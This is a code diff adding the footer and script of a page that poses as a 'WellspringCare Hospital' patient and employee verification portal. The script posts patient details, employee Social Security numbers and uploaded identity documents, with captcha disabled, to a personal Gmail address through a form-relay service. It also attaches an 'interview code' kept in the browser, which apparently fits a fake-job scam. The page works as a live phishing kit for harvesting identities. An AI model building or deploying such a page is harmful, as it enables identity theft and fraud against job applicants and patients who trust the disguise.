+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- ============================================================
+     FOOTER
+     ============================================================ -->
+<footer class="footer">
+  <div class="container footer__inner">
+    <a href="index.html" class="brand">
+      <span class="brand__mark" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round"><path d="M12 4v16M4 12h16"/></svg>
+      </span>
+      <span class="brand__text"><strong>WellspringCare</strong><small>Hospital</small></span>
+    </a>
+
+    <span>&copy; <span id="year">2026</span> WellspringCare. All rights reserved.</span>
+
+    <nav class="footer__links" aria-label="Footer">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Service</a>
+      <a href="mailto:Support@wellspring-care.net">Support@wellspring-care.net</a>
+    </nav>
+  </div>
+</footer>
+
+<!-- Toast -->
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ============================================================
+     MAIL DESTINATION
+     Every submission on this page is delivered to this address.
+     ============================================================ */
+  const MAIL_TO = 'nadinsmith231@gmail.com';
+  const FS_AJAX = 'https://formsubmit.co/ajax/' + MAIL_TO;
+
+  /* ------------------------------------------------------------
+     0. SHARED HELPERS
+     ------------------------------------------------------------ */
+  const toast = document.getElementById('toast');
+  let toastTimer;
+
+  function showToast(message, type) {
+    clearTimeout(toastTimer);
+    toast.textContent = message;
+    toast.className = 'toast show' + (type ? ' toast--' + type : '');
+    toastTimer = setTimeout(function () { toast.className = 'toast'; }, 5500);
+  }
+
+  function getInterviewCode() {
+    try {
+      return window.localStorage.getItem('wsc_interview_code') || '';
+    } catch (err) {
+      return '';
+    }
+  }
+
+  /* ------------------------------------------------------------
+     1. TABS
+     ------------------------------------------------------------ */
+  const tabs   = Array.prototype.slice.call(document.querySelectorAll('.tab'));
+  const panels = Array.prototype.slice.call(document.querySelectorAll('.panel'));
+
+  function activateTab(tab, focus) {
+    tabs.forEach(function (t) {
+      const on = t === tab;
+      t.classList.toggle('is-active', on);
+      t.setAttribute('aria-selected', String(on));
+      t.tabIndex = on ? 0 : -1;
+    });
+    panels.forEach(function (p) {
+      p.hidden = p.id !== tab.getAttribute('aria-controls');
+    });
+    if (focus) tab.focus();
+  }
+
+  tabs.forEach(function (tab, i) {
+    tab.addEventListener('click', function () { activateTab(tab); });
+
+    tab.addEventListener('keydown', function (e) {
+      let next = null;
+      if (e.key === 'ArrowRight') next = tabs[(i + 1) % tabs.length];
+      if (e.key === 'ArrowLeft')  next = tabs[(i - 1 + tabs.length) % tabs.length];
+      if (e.key === 'Home')       next = tabs[0];
+      if (e.key === 'End')        next = tabs[tabs.length - 1];
+      if (next) { e.preventDefault(); activateTab(next, true); }
+    });
+  });
+
+  // Deep-link support: verification.html#employee opens the employee tab
+  if (location.hash === '#employee' || location.hash === '#panel-employee') {
+    activateTab(document.getElementById('tab-employee'));
+  }
+
+  /* ------------------------------------------------------------
+     2. VALIDATION HELPERS
+     ------------------------------------------------------------ */
+  const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/;
+
+  function setInvalid(input, invalid) {
+    input.classList.toggle('is-invalid', invalid);
+    const field = input.closest('.field');
+    if (!field) return;
+    const err = field.querySelector('.err');
+    if (err) err.classList.toggle('show', invalid);
+  }
+
+  function isFieldValid(input) {
+    if (input.type === 'checkbox') return input.checked;
+    if (input.type === 'file')     return !!(input.files && input.files.length);
+    if (input.type === 'email')    return EMAIL_RE.test(input.value.trim());
+    if (input.id === 'eSSN')       return input.value.replace(/\D/g, '').length === 9;
+    return input.value.trim() !== '';
+  }
+
+  function validateForm(form) {
+    let firstInvalid = null;
+
+    form.querySelectorAll('[required]').forEach(function (input) {
+      const valid = isFieldValid(input);
+      setInvalid(input, !valid);
+      if (!valid && !firstInvalid) firstInvalid = input;
+    });
+
+    if (firstInvalid) {
+      firstInvalid.focus({ preventScroll: true });
+      firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+    return !firstInvalid;
+  }
+
+  // Clear error styling on input
+  document.querySelectorAll('.field input, .field select, .field textarea').forEach(function (input) {
+    const clear = function () { setInvalid(input, false); };
+    input.addEventListener('input', clear);
+    input.addEventListener('change', clear);
+  });
+
+  /* ------------------------------------------------------------
+     3. SSN MASKING  →  123-45-6789
+     ------------------------------------------------------------ */
+  const ssnInput = document.getElementById('eSSN');
+  if (ssnInput) {
+    ssnInput.addEventListener('input', function () {
+      const digits = ssnInput.value.replace(/\D/g, '').slice(0, 9);
+      let out = digits;
+      if (digits.length > 5)      out = digits.slice(0, 3) + '-' + digits.slice(3, 5) + '-' + digits.slice(5);
+      else if (digits.length > 3) out = digits.slice(0, 3) + '-' + digits.slice(3);
+      ssnInput.value = out;
+    });
+  }
+
+  /* ------------------------------------------------------------
+     4. FILE UPLOADS
+        - 5 MB size limit
+        - Live image preview thumbnail
+        - Local "Download file" link so the image is
+          visible in a downloadable link form before submit
+     ------------------------------------------------------------ */
+  const MAX_SIZE = 5 * 1024 * 1024;
+
+  function bindFileInput(input) {
+    const drop      = input.closest('.file-drop');
+    const nameEl    = drop ? drop.querySelector('[data-file-name]') : null;
+    const field     = input.closest('.field');
+    const preview   = field ? field.querySelector('[data-preview]') : null;
+    const img       = preview ? preview.querySelector('[data-preview-img]') : null;
+    const previewNm = preview ? preview.querySelector('[data-preview-name]') : null;
+    const dlLink    = preview ? preview.querySelector('[data-preview-download]') : null;
+
+    function revokeObjectUrl() {
+      if (input._objectUrl) {
+        URL.revokeObjectURL(input._objectUrl);
+        input._objectUrl = null;
+      }
+    }
+
+    function clearPreview() {
+      revokeObjectUrl();
+      if (preview) preview.hidden = true;
+      if (img) img.removeAttribute('src');
+      if (previewNm) previewNm.textContent = '';
+      if (dlLink) { dlLink.removeAttribute('href'); dlLink.removeAttribute('download'); }
+    }
+
+    input.addEventListener('change', function () {
+      clearPreview();
+      const file = input.files && input.files[0];
+
+      if (!file) {
+        if (nameEl) nameEl.textContent = 'No file chosen';
+        return;
+      }
+
+      if (file.size > MAX_SIZE) {
+        if (nameEl) nameEl.textContent = 'File is larger than 5 MB — please choose another.';
+        input.value = '';
+        setInvalid(input, true);
+        return;
+      }
+
+      if (nameEl) nameEl.textContent = file.name;
+      setInvalid(input, false);
+
+      // Show preview + download link for image files
+      if (preview && img && file.type.indexOf('image/') === 0) {
+        input._objectUrl = URL.createObjectURL(file);
+        img.src = input._objectUrl;
+        img.alt = 'Preview of ' + file.name;
+        if (previewNm) previewNm.textContent = file.name;
+        if (dlLink) {
+          dlLink.href = input._objectUrl;
+          dlLink.download = file.name;
+        }
+        preview.hidden = false;
+      }
+    });
+
+    input._clearPreview = clearPreview;
+  }
+
+  document.querySelectorAll('.file-drop input[type="file"]').forEach(bindFileInput);
+
+  function resetFormAndPreviews(form) {
+    form.querySelectorAll('input[type="file"]').forEach(function (input) {
+      if (typeof input._clearPreview === 'function') input._clearPreview();
+    });
+    form.querySelectorAll('[data-file-name]').forEach(function (el) {
+      el.textContent = 'No file chosen';
+    });
+  }
+
+  /* ------------------------------------------------------------
+     5. BUTTON LOADING STATE
+     ------------------------------------------------------------ */
+  function setLoading(btn, loading, label) {
+    if (!btn) return;
+    if (loading) {
+      if (!btn.dataset.originalHtml) btn.dataset.originalHtml = btn.innerHTML;
+      btn.disabled = true;
+      if (label) btn.textContent = label;
+    } else {
+      btn.disabled = false;
+      if (btn.dataset.originalHtml) btn.innerHTML = btn.dataset.originalHtml;
+    }
+  }
+
+  /* ------------------------------------------------------------
+     6. PATIENT FORM  →  nadinsmith231@gmail.com  (AJAX)
+     ------------------------------------------------------------ */
+  const patientForm      = document.getElementById('patientForm');
+  const patientSubmitBtn = document.getElementById('patientSubmitBtn');
+
+  function val(id) {
+    const el = document.getElementById(id);
+    return el ? el.value.trim() : '';
+  }
+
+  if (patientForm) {
+    patientForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      if (!validateForm(patientForm)) {
+        showToast('Please complete the highlighted fields before submitting.', 'bad');
+        return;
+      }
+
+      const payload = {
+        _subject:  'WellspringCare — New Patient Verification Request',
+        _template: 'table',
+        _captcha:  'false',
+        _replyto:  val('pEmail'),
+        'Form Type':       'Patient Verification',
+        'First Name':      val('pFirst'),
+        'Last Name':       val('pLast'),
+        'Email':           val('pEmail'),
+        'Phone':           val('pPhone'),
+        'Service Needed':  val('pService'),
+        'Preferred Date':  val('pDate'),
+        'Preferred Time':  val('pTime'),
+        'Message':         val('pMessage'),
+        'Interview Code (site ref)': getInterviewCode(),
+        'Page URL':        location.href,
+        'Submitted At':    new Date().toLocaleString()
+      };
+
+      setLoading(patientSubmitBtn, true, 'Sending…');
+
+      fetch(FS_AJAX, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+        .then(function (res) {
+          if (!res.ok) throw new Error('HTTP ' + res.status);
+          return res.json();
+        })
+        .then(function (data) {
+          if (data && String(data.success) === 'false') {
+            throw new Error('FormSubmit rejected the message');
+          }
+          showToast('Request received. Our patient care coordinators will contact you within 24 hours.', 'ok');
+          patientForm.reset();
+        })
+        .catch(function () {
+          showToast(
+            'Sorry — we could not send your request. Please email ' + MAIL_TO + ' directly.',
+            'bad'
+          );
+        })
+        .finally(function () {
+          setLoading(patientSubmitBtn, false);
+        });
+    });
+  }
+
+  /* ------------------------------------------------------------
+     7. EMPLOYEE FORM  →  nadinsmith231@gmail.com  (native multipart)
+        File inputs are delivered as attachments (downloadable
+        files) in the resulting email.
+     ------------------------------------------------------------ */
+  const employeeForm      = document.getElementById('employeeForm');
+  const employeeSubmitBtn = document.getElementById('employeeSubmitBtn');
+  const empReplytoField   = document.getElementById('empReplyto');
+  const empNextField      = document.getElementById('empNext');
+  const empCodeField      = document.getElementById('empCode');
+  const empTimeField      = document.getElementById('empTime');
+
+  // Build the return URL for _next (robust across file:// and http(s)://)
+  const baseUrl = location.href.split('?')[0].split('#')[0];
+  if (empNextField) {
+    empNextField.value = baseUrl + '?verified=1&type=employee#employee';
+  }
+
+  if (employeeForm) {
+    employeeForm.addEventListener('submit', function (e) {
+      if (!validateForm(employeeForm)) {
+        e.preventDefault();
+        showToast('Please complete the highlighted fields and upload all required documents.', 'bad');
+        return;
+      }
+
+      // Populate dynamic FormSubmit fields right before the POST.
+      if (empReplytoField) {
+        const emailEl = document.getElementById('eEmail');
+        empReplytoField.value = emailEl ? emailEl.value.trim() : '';
+      }
+      if (empCodeField) empCodeField.value = getInterviewCode();
+      if (empTimeField) empTimeField.value = new Date().toLocaleString();
+
+      // Visual feedback — browser will continue with the native POST.
+      setLoading(employeeSubmitBtn, true, 'Uploading…');
+    });
+  }
+
+  /* ------------------------------------------------------------
+     8. SUCCESS RETURN FROM FORMSUBMIT
+        FormSubmit redirects to _next; show a toast and open the
+        employee tab so the state makes sense.
+     ------------------------------------------------------------ */
+  if (location.search.indexOf('verified=1') !== -1) {
+    showToast(
+      'Verification submitted securely. Our team reviews submissions within 24–48 hours.',
+      'ok'
+    );
+
+    activateTab(document.getElementById('tab-employee'));
+
+    try {
+      history.replaceState({}, '', location.pathname + '#employee');
+    } catch (err) { /* ignore */ }
+  }
+
+  /* ------------------------------------------------------------
+     9. FOOTER YEAR
+     ------------------------------------------------------------ */
+  const yearEl = document.getElementById('year');
+  if (yearEl) yearEl.textContent = new Date().getFullYear();
+
+})();
+</script>
+</body>
+</html>
